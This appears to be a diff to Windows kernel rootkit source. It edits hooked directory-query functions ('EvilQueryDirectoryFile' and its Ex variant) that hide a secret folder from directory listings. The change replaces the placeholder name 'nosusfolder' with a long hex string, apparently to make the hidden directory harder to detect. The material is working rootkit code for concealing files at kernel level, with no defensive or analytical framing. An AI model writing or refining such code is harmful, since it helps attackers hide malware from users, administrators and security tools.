@@ -209,7 +209,7 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	UNICODE_STRING CurrentFile = { 0 };
 	UNICODE_STRING SusFolder = { 0 };
 	UNICODE_STRING QueryUnicode = { 0 };
-	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
+	RtlInitUnicodeString(&SusFolder, L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097");
 	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");
 
 	IO_STATUS_BLOCK DirStatus = { 0 };
@@ -229,7 +229,7 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	}
 
 
-	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
+	// Allocate buffer for handle path (format - "\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\...\actualsearchdir) and get the handle path:
 	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
 	if (HandleInfo == NULL) {
 		return STATUS_UNSUCCESSFUL;
@@ -244,7 +244,7 @@ NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
 	ExFreePool(HandleInfo);
 
 
-	// Search if path starts with "nosusfolder":
+	// Search if path starts with "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097":
 	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
 	
 	
@@ -272,7 +272,7 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	UNICODE_STRING CurrentFile = { 0 };
 	UNICODE_STRING SusFolder = { 0 };
 	UNICODE_STRING QueryExUnicode = { 0 };
-	RtlInitUnicodeString(&SusFolder, L"nosusfolder");
+	RtlInitUnicodeString(&SusFolder, L"9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097");
 	RtlInitUnicodeString(&QueryExUnicode, L"NtQueryDirectoryFileEx");
 
 	IO_STATUS_BLOCK DirStatus = { 0 };
@@ -293,7 +293,7 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	}
 
 
-	// Allocate buffer for handle path (format - "\nosusfolder\verysus\...\actualsearchdir) and get the handle path:
+	// Allocate buffer for handle path (format - "\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\...\actualsearchdir) and get the handle path:
 	HandleInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'KfHi');
 	if (HandleInfo == NULL) {
 		return STATUS_UNSUCCESSFUL;
@@ -308,7 +308,7 @@ NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
 	ExFreePool(HandleInfo);
 
 
-	// Search if path starts with "nosusfolder":
+	// Search if path starts with "9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097":
 	SearchForInitialEvilDir(&RequestedDir, &IsSystemRoot, &IsDirSame, 2);
 
 
